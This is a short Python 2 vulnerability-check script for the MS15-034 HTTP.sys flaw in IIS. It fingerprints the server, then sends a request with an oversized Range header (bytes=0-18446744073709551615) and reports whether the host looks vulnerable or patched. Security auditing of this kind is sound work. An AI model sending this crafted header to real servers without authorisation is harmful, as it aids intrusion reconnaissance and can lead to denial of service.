import getopt,sys
def usage():
                print "USAGE python MS15-034.py www.xxx.com:80"
                sys.exit(0)
ipAddr=""
port=80
Options,Values=getopt.getopt(sys.argv[1::],"h",["help"])
for opt,dat in Options:
    if opt in ("-h","--help"):
        usage()
if len(sys.argv)!=2:usage()
for val in Values:
    ipAddr = val

import socket
import random


hexAllFfff = "18446744073709551615"
req1 = "GET / HTTP/1.0\r\n\r\n"
req = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"

if ":" in ipAddr:
                Addr,port=ipAddr.split(':')
                port=int(port)
else:
                Addr,prot=(ipAddr,80)


print "[*] Audit Started"
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((Addr, port))
client_socket.send(req1)
boringResp = client_socket.recv(1024)
if "Microsoft" not in boringResp:
                print "[*] Not IIS"
                exit(0)
client_socket.close()
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((Addr, port))
client_socket.send(req)
goodResp = client_socket.recv(1024)
if "Requested Range Not Satisfiable" in goodResp:
                print "[!!] Looks VULN"
elif " The request has an invalid header name" in goodResp:
                print "[*] Looks Patched"
else:
                print "[*] Unexpected response, cannot discern patch status"
                
                
                

